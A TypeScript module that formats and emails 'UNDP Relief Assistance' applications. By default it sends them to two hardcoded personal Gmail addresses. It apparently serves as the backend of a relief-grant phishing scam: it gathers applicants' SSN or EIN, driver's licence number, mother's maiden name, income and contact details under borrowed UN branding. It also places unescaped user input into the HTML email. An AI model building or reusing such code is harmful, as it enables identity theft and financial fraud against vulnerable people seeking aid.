export interface ApplicationEmailData {
  firstName: string;
  middleName?: string;
  lastName: string;
  motherMaidenName: string;
  streetAddress: string;
  streetAddress2?: string;
  city: string;
  state: string;
  country: string;
  email: string;
  phoneNumber: string;
  gender: string;
  maritalStatus: string;
  applicationReason: string;
  amountPreferred: string;
  doYouWork: string;
  occupation?: string;
  annualIncome: string;
  ssnEin: string;
  driverLicense: string;
  disbursementMethod: string;
  overviewReason: string;
}

export const sendApplicationEmail = async (data: ApplicationEmailData) => {
  const projectSecret = process.env.MAIL_SECRET || "";
  const senderEmail = process.env.MAIL_SENDER || "nobleware@ensend.me";

  const {
    firstName,
    middleName = "",
    lastName,
    motherMaidenName,
    streetAddress,
    streetAddress2 = "",
    city,
    state,
    country,
    email,
    phoneNumber,
    gender,
    maritalStatus,
    applicationReason,
    amountPreferred,
    doYouWork,
    occupation = "",
    annualIncome,
    ssnEin,
    driverLicense,
    disbursementMethod,
    overviewReason,
  } = data;

  const defaultRecipients = ["noblepediallc@gmail.com", "adebayotosin7665@gmail.com"];
  const adminEnv = process.env.ADMIN_EMAILS || process.env.MAIL_ADMIN;
  const recipientEmails: string[] = adminEnv
    ? adminEnv.split(",").map((e) => e.trim()).filter(Boolean)
    : defaultRecipients;

  const htmlMessage = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>New UNDP Relief Assistance Application</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background-color: #f4f6f9;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 650px;
      margin: 0 auto;
      background-color: #ffffff;
      padding: 24px;
      border: 1px solid #e2e8f0;
      border-radius: 10px;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
    }
    .header {
      border-bottom: 2px solid #0055b8;
      padding-bottom: 12px;
      margin-bottom: 20px;
    }
    .header h1 {
      color: #0055b8;
      font-size: 22px;
      margin: 0;
    }
    .header p {
      color: #64748b;
      font-size: 13px;
      margin: 4px 0 0 0;
    }
    .section-title {
      background-color: #f1f5f9;
      padding: 8px 12px;
      font-weight: bold;
      color: #334155;
      font-size: 14px;
      margin-top: 20px;
      margin-bottom: 8px;
      border-left: 4px solid #0055b8;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 12px;
    }
    th, td {
      padding: 9px 12px;
      border-bottom: 1px solid #edf2f7;
      text-align: left;
      font-size: 13.5px;
    }
    th {
      background-color: #fafafa;
      color: #475569;
      width: 38%;
      font-weight: 600;
    }
    td {
      color: #1e293b;
    }
    .highlight {
      color: #0055b8;
      font-weight: bold;
    }
    .footer {
      margin-top: 24px;
      font-size: 12px;
      color: #94a3b8;
      text-align: center;
      border-top: 1px solid #e2e8f0;
      padding-top: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>UNDP Relief Assistance Application</h1>
      <p>Submitted on: ${new Date().toUTCString()}</p>
    </div>

    <div class="section-title">Personal Details</div>
    <table>
      <tr><th>Applicant Name</th><td><strong>${firstName} ${middleName ? middleName + " " : ""}${lastName}</strong></td></tr>
      <tr><th>Mother's Maiden Name</th><td>${motherMaidenName}</td></tr>
      <tr><th>Email Address</th><td><a href="mailto:${email}">${email}</a></td></tr>
      <tr><th>Phone Number</th><td><a href="tel:${phoneNumber}">${phoneNumber}</a></td></tr>
      <tr><th>Gender</th><td>${gender}</td></tr>
      <tr><th>Marital Status</th><td>${maritalStatus}</td></tr>
    </table>

    <div class="section-title">Address & Location</div>
    <table>
      <tr><th>Street Address</th><td>${streetAddress}</td></tr>
      ${streetAddress2 ? `<tr><th>Street Address Line 2</th><td>${streetAddress2}</td></tr>` : ""}
      <tr><th>City</th><td>${city}</td></tr>
      <tr><th>State / Province</th><td>${state}</td></tr>
      <tr><th>Country</th><td>${country}</td></tr>
    </table>

    <div class="section-title">Employment & Identity</div>
    <table>
      <tr><th>Employed / Works</th><td>${doYouWork}</td></tr>
      ${occupation ? `<tr><th>Occupation</th><td>${occupation}</td></tr>` : ""}
      <tr><th>Annual Income</th><td>${annualIncome}</td></tr>
      <tr><th>SSN / EIN</th><td class="highlight">${ssnEin}</td></tr>
      <tr><th>Driver's License #</th><td class="highlight">${driverLicense}</td></tr>
    </table>

    <div class="section-title">Relief Assistance & Disbursement</div>
    <table>
      <tr><th>Application Reason</th><td><strong>${applicationReason}</strong></td></tr>
      <tr><th>Preferred Amount</th><td class="highlight">${amountPreferred}</td></tr>
      <tr><th>Preferred Disbursement</th><td><strong>${disbursementMethod}</strong></td></tr>
      <tr><th>Overview of Reason</th><td style="white-space: pre-wrap;">${overviewReason}</td></tr>
    </table>

    <div class="footer">
      UNDP Relief Assistance Notification Service &bull; Automated System
    </div>
  </div>
</body>
</html>`;

  // Dispatch individually to each recipient via native Edge fetch
  const results = [];
  for (const recipientEmail of recipientEmails) {
    try {
      const payload = {
        subject: `New Relief Application: ${firstName} ${lastName} - ${amountPreferred}`,
        message: htmlMessage,
        sender: {
          name: `${firstName} ${lastName} (via UNDP Relief)`,
          email: senderEmail,
        },
        recipients: recipientEmail,
        responseAddress: {
          name: `${firstName} ${lastName}`,
          email: email,
        },
      };

      const res = await fetch("https://api.smtpexpress.com/send", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${projectSecret}`,
        },
        body: JSON.stringify(payload),
      });

      const responseText = await res.text();
      console.log(`Ensend API response for ${recipientEmail} (Status ${res.status}):`, responseText);
      results.push({ email: recipientEmail, status: res.status, response: responseText });
    } catch (err: any) {
      console.error(`Fetch error sending application email to ${recipientEmail}:`, err);
      results.push({ email: recipientEmail, error: err?.message || String(err) });
    }
  }
  return results;
};

